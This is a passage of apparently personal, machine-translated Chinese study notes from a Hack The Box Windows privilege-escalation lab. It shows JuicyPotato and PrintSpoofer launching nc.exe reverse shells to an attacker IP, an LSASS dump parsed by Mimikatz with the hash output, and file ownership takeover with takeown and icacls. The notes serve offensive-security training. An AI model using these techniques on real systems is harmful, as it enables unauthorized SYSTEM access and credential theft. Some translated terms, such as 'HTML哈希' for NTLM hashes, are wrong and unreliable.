SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled </code></pre>
<p>当我们的账户在 <code>“禁用</code> ”状态下显示有权限时，说明我们的账户拥有该特权。不过，在启用之前，它不能用于访问令牌来执行相关作。Windows 没有内置命令或 PowerShell cmdlet 来启用权限，所以我们需要一些脚本来帮忙。在本模块中，我们将看到滥用各种特权的方法，以及在当前流程中实现特定特权的各种方式。一个例子是这个 PowerShell 脚本 ，可以用来启用某些权限， 或者这个脚本可以用来调整令牌权限。</p>
<p>相比之下，普通用户权限很少</p>
<p><strong>普通用户权力</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami 

winlpe-srv01\htb-student


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>用户权利会根据他们被分配到的组或分配的权限而增加。以下是备份组中授予用户权利的一个示例。该组用户拥有 UAC 目前限制的其他权利。不过，从这个命令我们可以看出他们有 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system" target="_blank" rel="noreferrer">SeShutdownPrivilege</a>，这意味着他们可以关闭一个域控制器，如果他们在本地登录域控制器（而不是通过 RDP 或 WinRM），可能会导致巨大的服务中断。</p>
<p><strong>Backup Operators Rights， 备用权力</strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p><strong>Detection  检测</strong></p>
<p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" target="_blank" rel="noreferrer">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" target="_blank" rel="noreferrer">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. 本文值得[](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e)一读，了解更多关于 Windows 权限以及检测和防止滥用的信息，特别是通过记录事件 4672：分配给新登录的特殊权限 ，如果新登录会话被分配了某些敏感权限，该事件将引发事件。这可以通过多种方式进行微调，比如监控_不应_被分配的权限，或只应分配给特定账户的权限。</p>
<h3>SeImpersonate 与 SeAssignPrimaryToken 权限</h3>
<p>在 Windows 中，每个进程都有一个令牌，里面包含运行该账户的信息。这些令牌不被视为安全资源，因为它们只是内存中可能被无法读取内存的用户暴力破解的内存位置。要使用该令牌，需要具备<code>冒充</code>特权。该保护仅授予管理账户，且在大多数情况下可在系统加固过程中移除。使用该令牌的一个例子是 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" target="_blank" rel="noreferrer">CreateProcessWithTokenW</a>。</p>
<p>合法程序可以利用其他进程的令牌从管理员升级到本地系统，后者拥有额外权限。进程通常通过调用 WinLogon 进程获取 SYSTEM 令牌，然后用该令牌执行自身，并将其置于 SYSTEM 空间中。攻击者常在“土豆式”私密账户中滥用此权限——服务账户可以<code>冒充</code> ，但无法获得完整的系统级权限。本质上，Potato 攻击欺骗以 SYSTEM 运行的进程连接到其进程，进进程交出供使用的令牌。</p>
<p>我们通常会在通过在服务账户上下文中运行的应用程序获得远程代码执行后获得此权限（例如，将网页壳上传到 ASP.NET 的网页应用，通过 Jenkins 安装实现远程代码执行，或通过 MSSQL 查询执行命令）。每当我们通过这种方式获得访问权限时，应立即检查是否有权限，因为它的存在通常为获得更高权限提供了快速且便捷的途径。本文值得一读，以了解更多关于代币冒充攻击的细节。</p>
<p><strong>Selmpersonate Example - JuicyPotato</strong> 我们以下面的例子为例，我们通过一个特权 SQL 用户在 SQL 服务器上站稳脚跟。客户端连接到 IIS 和 SQL Server 时可以配置为使用 Windows 认证。服务器随后可能需要访问其他资源，如文件共享，作为连接客户端。这可以通过冒充客户端连接所建立的上下文用户来实现。为此，服务账户将在认证权限后获得“ 冒充客户端 ”的授权。</p>
<p>在这种情况下，SQL Service 服务账户运行在默认的 <code>mssqlserver</code> 账户上下文中。想象一下，我们通过 <code>Snaffler</code> 工具实现了命令执行，用户使用 <code>xp_cmdshell</code> 在文件共享中获得的 <code>logins.sql</code> 文件中的一组凭证。</p>
<p>利用凭证 <code>sql_dev：Str0ng_P@ssw0rd！</code>，我们先连接到 SQL 服务器实例并确认权限。我们可以用 <code>Impacket</code> 工具包中的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" target="_blank" rel="noreferrer">mssqlclient.py</a> 来实现这一点。</p>
<ol><li>Connecting with MSSQLClient.py</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-mssqlclient sql_dev@10.129.28.157 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL&gt;</code></pre>
<p>接下来，我们必须启用 <code>xp_cmdshell</code> 存储过程来运行作系统命令。我们可以通过输入 <code>enable_xp_cmdshell</code> 来实现 Impacket MSSSQL shell 的作。输入<code>help</code>时会显示一些其他命令选项。</p>
<ol><li>Enabling xp_cmdshell</li></ol>
<pre><code class="language-shell-session">SQL&gt; enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install</code></pre>
<p>有了这个访问权限，我们可以确认我们确实是在 SQL Server 服务账户的上下文中运行的。</p>
<ol><li>Confirming Access</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01</code></pre>
<ol><li>Checking Account Privileges</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </code></pre>
<p>命令 <code>whoami /priv</code> 确认 <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" target="_blank" rel="noreferrer">SeImpersonatePrivilege</a> 已被列出。该特权可用于冒充如 <code>NT AUTHORITY\SYSTEM</code> 等特权账户。<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noreferrer">JuicyPotato</a> 可以通过 DCOM/NTLM 反射滥用来利用 <code>SeImpassate</code> 或 <code>SeAssignPrimaryToken</code> 的权限。</p>
<p>为了利用这些权限升级权限，首先下载 <code>JuicyPotato.exe</code> 二进制文件并上传，并 <code>nc.exe</code> 到目标服务器。接着，在 8443 端口建立一个 Netcat 监听器，执行以下命令，其中 <code>-l</code> 是 COM 服务器监听端口， <code>-p</code> 是启动程序（cmd.exe）， <code>-a</code> 是传递给 cmd.exe 的参数， <code>-t</code> 是 <code>createprocess</code> 调用。 下面，我们告诉该工具同时尝试 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" target="_blank" rel="noreferrer">CreateProcessWithTokenW</a> 和 <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera" target="_blank" rel="noreferrer">CreateProcessAsUser</a> 函数，这两者分别需要 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 权限。</p>
<ol><li>Escalating Privileges Using JuicyPotato</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.38 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08</code></pre>
<p>此过程成功完成，并接收到一个名为 <code>NT AUTHORITY\SYSTEM</code> 的壳。</p>
<ol><li>Catching SYSTEM Shell</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system


C:\Windows\system32&gt;hostname

hostname
WINLPE-SRV01</code></pre>
<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato 无法支持 Windows Server 2019 和 Windows 10 版本 1809 及以后版本。然而，<a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noreferrer">PrintSpoofer</a> 和 <a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noreferrer">RoguePotato</a> 也可以利用相同的权限，获得 <code>NT 权威/系统</code>级别的访问权限。这篇博客文章深入介绍了 <code>PrintSpoofer</code> 工具，该工具可用于滥用 Windows 10 和 Server 2019 主机上的冒充权限，而 JuicyPotato 已无法正常工作。</p>
<p>让我们用 <code>PrintSpoofer</code> 工具试试看。我们可以用这个工具在你当前控制台中生成一个 SYSTEM 进程并与之交互，在桌面上生成一个 SYSTEM 进程（如果是本地登录或通过 RDP），或者捕捉反向 shell——我们在我们的示例中会做这件事。同样，连接 <code>mssqlclient.py</code>，使用带有 <code>-c</code> 参数的工具执行命令。这里，利用 <code>nc.exe</code> 生成反向 shell（Netcat 监听器在 8443 端口等待我们的攻击盒）。</p>
<ol><li>Escalating Privilege using PrintSpoofer</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.38 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL </code></pre>
<p>如果一切顺利，我们的 netcat 监听器将有一个 SYSTEM 壳。</p>
<ol><li>Catching Reverse Shell as SYSTEM</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system</code></pre>
<h3>SeDebugPrivilege 调试权限</h3>
<p>为了运行某个特定应用程序或服务或协助故障排除，用户可能会被分配 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" target="_blank" rel="noreferrer">SeDebugPrivilege</a>，而不是将该账户添加到管理员组中。该权限可以通过本地或域组策略在 <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code> .默认情况下，只有管理员拥有此权限，因为它可用于从系统内存中捕获敏感信息，或访问/修改内核和应用结构。该权利可能分配给需要在日常工作中调试新系统组件的开发者。该用户权利应谨慎授予，因为任何被分配的账户都会访问关键作系统组件。</p>
<p>在内部渗透测试中，利用 LinkedIn 等网站收集潜在用户信息以进行定位通常很有帮助。假设我们正在使用 <code>Responder</code> 或 <code>Inveigh</code> 获取许多 NTLMv2 密码哈希值。在这种情况下，我们可能想将破解密码哈希的努力重点放在可能的高价值账户上，比如更可能被分配此类权限的开发者。用户可能不是主机的本地管理员，但拥有我们无法用 BloodHound 等工具远程枚举的权利。在我们为多个用户获取凭证，并且拥有一个或多个主机的 RDP 访问权限但没有额外权限的环境下，这点值得检查。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png" alt="Pasted image 20260228032219" />
<p>作为被分配调试<code>程序</code>权限的用户登录并打开提升的 shell 后，我们看到 <code>SeDebugPrivilege</code> 被列为列表。</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set      </code></pre>
<p>我们可以利用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noreferrer">SysInternals</a> 套件中的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noreferrer">ProcDump</a> 来利用这一权限，转储进程内存。一个不错的候选是本地安全管理局子系统服务（<a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service" target="_blank" rel="noreferrer">LSASS</a>）进程，它在用户登录系统后存储用户凭证。</p>
<pre><code class="language-cmd-session">C:\htb&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.</code></pre>
<p>这成功了，我们可以在 <code>Mimikatz</code> 中使用 <code>sekurlsa：：minidump</code> 命令加载。在发送 <code>sekurlsa：：logonPasswords</code> 命令后，我们获得了本地登录的本地管理员账户的 NTLM 哈希值。我们可以利用这个方法进行“传递哈希”攻击，如果同一本地管理员密码被用于一个或多个额外系统（大型组织中常见），从而进行横向移动。</p>
<p>注意：在“Mimikatz”中运行任何命令前，最好先输入“log”，这样所有命令输出都会生成“.txt”文件。这在从可能存在多组凭证的服务器导出凭证时尤其有用。</p>
<pre><code class="language-cmd-session">C:\htb&gt; mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

&lt;SNIP&gt; 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

&lt;SNIP&gt;</code></pre>
<p>假设我们因为某种原因无法在目标上加载工具，但拥有 RDP 访问权限。在这种情况下，我们可以通过任务管理器手动转储 <code>LSASS</code> 进程，方法是浏览“ <code>Details</code> ”标签，选择 <code>LSASS</code> 进程，然后选择 <code>Create dump file</code> 。将该文件下载回攻击系统后，我们可以用 Mimikatz 处理它，就像前面的例子一样。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228035858.png" alt="Pasted image 20260228035858" />
<p><strong>先用procdump.exe来运行lsass.exe这个程序，之后转存其dump文件到mimikatz.exe的同目录下，并运行mimikatz.exe，在执行这三条命令<code>log</code> <code>sekurlsa::minidump lsass.dmp</code> <code>sekurlsa::logonpasswords</code> ，就可以获得HTML哈希</strong></p>
<p><strong>作为SYSTEM的远程代码执行</strong> 我们也可以利用 <code>SeDebugPrivilege</code> 来实现 <a href="https://decoder.cloud/2018/02/02/getting-system/" target="_blank" rel="noreferrer">RCE</a>。利用这种技术，我们可以通过启动子进程 ，利用通过 <code>SeDebugPrivilege</code> 赋予账户的提升权限，改变正常系统行为，继承父进程的令牌并冒充它，从而将权限提升到 SYSTEM。如果我们以 SYSTEM 形式运行的父进程（指定目标进程或运行程序的进程 ID（或 PID），那么我们可以快速提升权限。让我们看看实际作。</p>
<p>首先，将这个 PoC 脚本传输到目标系统。接下来我们只需加载脚本，并用以下语法 <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code> 运行。注意，我们必须在末尾添加第三个空参数 <code>""</code>，这样 PoC 才能正常工作。</p>
<p>首先，打开一个提升级的 PowerShell 控制台（右键点击，以管理员身份运行，输入 <code>Jordan</code> 用户的凭据）。接着，输入<code>任务列表</code> ，获取正在运行的进程及其相关 PID 的列表。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K</code></pre>
<p>这里我们可以针对运行在 PID 612 下的 <code>winlogon.exe</code>，我们知道它在 Windows 主机上作为 SYSTEM 运行。</p>
<p>我们也可以使用 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2" target="_blank" rel="noreferrer">Get-Process</a> cmdlet 抓取一个知名进程（如 LSASS）的 PID，并直接传递给脚本，从而减少所需的步骤。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png" alt="Pasted image 20260228040031" />
<p>还有类似这样的工具，可以在我们有 <code>SeDebugPrivilege</code> 时弹出 SYSTEM shell。通常我们无法通过 RDP 访问主机，因此必须修改 PoC，要么将反向 shell 返回攻击主机，作为 SYSTEM，要么通过其他命令，比如添加管理员用户。试着玩玩这些 PoC，看看还有什么其他方式可以实现 SYSTEM 访问，尤其是当你没有完全交互式的会话时，比如实现命令注入，或者作为 <code>SeDebugPrivilege</code> 的用户拥有网页壳或反向 shell 连接。请记住这些例子，以防你遇到倾销 LSASS 无法获得有用凭证的情况（虽然我们可以通过机器的 NTLM 哈希获得 SYSTEM 访问权限，但这超出本模块范围），并且用 shell 或 RCE 作为 SYSTEM 会很有帮助。</p>
<h3>SeTakeOwnershipPrivilege 取得所有权权限</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" target="_blank" rel="noreferrer">SeTakeOwnershipPrivilege</a> 赋予用户对任何“可保护对象”的所有权，即 Active Directory 对象、NTFS 文件/文件夹、打印机、注册表键、服务和进程。该权限赋予 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" target="_blank" rel="noreferrer">WRITE_OWNER</a> 对对象的权利，意味着用户可以在对象的安全描述符内更改所有者。管理员默认被赋予此权限。虽然很少遇到具有此权限的标准用户账户，但我们可能会遇到例如被赋予该权限的服务账户，负责运行备份作业和 VSS 快照。它还可能被赋予一些其他账户，如 <code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> 和 <code>SeSecurityPrivilege</code>，以更细致地控制该账户的权限，而不赋予账户完整的本地管理员权限。这些特权本身很可能被用来升级特权。不过，有时我们可能需要对特定文件负责，因为其他方法被阻挡，或者其他方法无法如预期般工作。滥用这种特权有点特殊。不过，深入理解还是值得的，尤其是因为在 Active Directory 环境中，我们可能会遇到这样一种情景，可以将这项权利分配给特定用户，并利用它来读取文件共享上的敏感文件。</p>
<p><strong>WRITE_OWNER 权限</strong> 意思是：</p>
<blockquote>你可以修改对象的 Owner 字段。</blockquote>
<p>注意一个关键逻辑： <strong>Windows 有个隐藏规则：</strong> <strong>对象的所有者天然有权修改 DACL。</strong> 所以攻击链是：</p>
<ol><li>你用 SeTakeOwnershipPrivilege 把文件“抢过来”</li><li>你成为 Owner</li><li>作为 Owner，你可以修改 ACL</li><li>给自己 Full Control</li><li>然后随便读写</li></ol>
<p>这就是它危险的地方。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228044423.png" alt="Pasted image 20260228044423" />
<p>该设置可以在组策略中设置：</p>
<p><code>计算机配置</code> ⇾ <code>Windows 设置</code> ⇾ <code>安全设置</code> ⇾ <code>本地策略</code> ⇾ <code>用户权限分配</code></p>
<ul><li><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></li></ul>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228044443.png" alt="Pasted image 20260228044443" />
<p>有了此权限，用户可以拥有任何文件或对象的所有权，并进行涉及敏感数据访问、 <code>远程代码执行</code> （<code>RCE</code>）或<code>拒绝服务</code> （DOS）的更改。</p>
<p>假设我们遇到拥有此权限的用户，或通过使用 <a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noreferrer">SharpGPOAbuse</a> 等攻击（如 GPO 滥用）赋予该权限。在这种情况下，我们可以利用这个权限来控制共享文件夹或敏感文件，比如包含密码的文档或 SSH 密钥。</p>
<p><strong>利用权限, Leveraging the Privilege</strong></p>
<ol><li>审查当前用户权限</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled</code></pre>
<p>从输出中注意，该权限未被启用。我们可以使用这个脚本来启用它，这个脚本在这篇博客文章中有详细介绍，也可以用这个脚本，它基于最初的概念展开。</p>
<ol><li>Enabling SeTakeOwnershipPrivilege</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module .\Enable-Privilege.ps1
PS C:\htb&gt; .\EnableAllTokenPrivs.ps1
PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled</code></pre>
<pre><code>PS C:\TakeOwn&gt; icacls C:\TakeOwn\flag.txt /grant "$env:USERNAME\`:(F)"
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\TakeOwn&gt; type flag.txt
1m_th3_f1l3_0wn3r_n0W!
PS C:\TakeOwn&gt;
</code></pre>
<p>接下来，选择一个目标文件并确认当前的所有权。就我们的目的而言，我们将针对一个在文件共享中找到的有趣文件。常见文件<code>共享是公共</code>和<code>私有</code>目录，并由部门设立子目录。鉴于用户在公司中的角色，他们通常可以访问特定的文件或目录。即使有这样的结构，系统管理员也可能错误配置目录和子目录权限，这使得文件共享成为我们获得 Active Directory 凭证（有时甚至不需要凭证）的丰富信息来源。在我们的情景中，假设我们能够访问目标公司的文件共享，并且可以自由浏览<code>私有</code>和<code>公共</code>子目录。大多数情况下，我们发现权限设置非常严格，且没有发现关于文件共享的<code>公开</code>部分有任何有趣的信息。在浏览<code>私密</code>部分时，我们发现所有域用户可以列出某些子目录的内容，但在尝试读取大多数文件内容时会收到<code>拒绝访问</code>的提示。在列举过程中，我们在<code>私有</code>共享文件夹的 <code>IT</code> 子目录下发现了一个名为 <code>cred.txt</code> 的文件。</p>
<ol><li>选择目标文件</li></ol>
<p>鉴于我们的用户账户拥有 <code>SeTakeOwnershipPrivilege</code>（可能已经被授予），或者我们利用其他错误配置，比如过于宽松的组策略对象（GPO）赋予该权限），我们可以利用它读取任意文件。</p>
<p>让我们看看我们的目标档案，以获取更多相关信息。</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive</code></pre>
<p>我们可以看到所有者没有显示，这意味着我们可能没有足够的权限去查看这些细节。我们可以倒带一点，查查 IT 目录的所有者。</p>
<ol><li>检查文件所有权</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free</code></pre>
<p>我们可以看到 IT 共享似乎属于一个服务账户，并且确实包含一个文件 <code>cred.txt</code> 里面有一些数据。</p>
<p>现在我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown" target="_blank" rel="noreferrer">Takeown</a> Windows 二进制文件来更改文件的所有权。</p>
<ol><li>接管文件的所有权</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".</code></pre>
<p>我们可以用之前的同一个命令确认所有权。我们现在看到我们的用户账户是文件所有者。</p>
<ol><li>确认所有权变更</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student</code></pre>
<p>我们可能仍然无法读取文件，需要用 <code>ICACL</code> 修改文件 ACL 才能读取。</p>
<ol><li>修改为文件的ACL</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<p>我们先赋予用户对目标文件的全部权限。</p>
